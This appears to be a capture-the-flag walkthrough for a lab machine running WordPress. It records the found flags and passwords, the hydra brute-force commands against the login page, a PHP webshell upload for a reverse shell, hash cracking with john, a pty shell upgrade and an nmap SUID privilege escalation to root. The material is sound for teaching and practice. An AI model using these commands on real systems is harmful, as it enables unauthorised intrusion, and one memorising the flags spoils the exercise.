# 10.10.163.148


# Robots.txt
- gave me a dictionary
- gave me a key (Q1):073403c8a58a1f80d943455fb30724b9


# WP-login creds:
- Elliot
- ER28-0652


# robot creds
- su robot
- abcdefghijklmnopqrstuvwxyz


# Methodology
1. Robots.txt gave out the first key
2. Robots.txt gave out a dictionary
3. Gobuster found it's wordpress site
4. Login page indicates if username is invalid
5. Bruteforce the login: hydra -L dic.txt -p test 10.10.163.148 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username"
6. The username is Elliot 
7. Hydra again using the username: hydra -l Elliot -P dic.txt 10.10.163.148 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30
8. The password is  ER28-0652 
9. We have access to wordpress editor -  uploaded a php webshell and got reverse shell
10. there is hash in home/robot: c3fcd3d76192e4007dfb496cca67e13b
11. Used https://crackstation.net/ to hack it abcdefghijklmnopqrstuvwxyz
12. it can also be cracked using john:  john md5.hash --wordlist=fsociety.dic --format=Raw-MD5
13. you could use hash-identifier tool in kali to identify what kind of hash it is.
14. get interactive shell: python -c 'import pty;pty.spawn("/bin/bash")'
15. switch to robot user with the given password: su robot
16. read the second key at home/robot: 822c73956184f694993bede3eb39f959
17. checked files with SUID set: find / -perm -4000 -type f 2>/dev/null 
18. found nmap with SUID set
19. use GTFObins: https://gtfobins.github.io/gtfobins/nmap/
nmap --interactive
nmap> !sh

20. rooted. find the last flag at:  04787ddef27c3dee1ee161b21670b4e4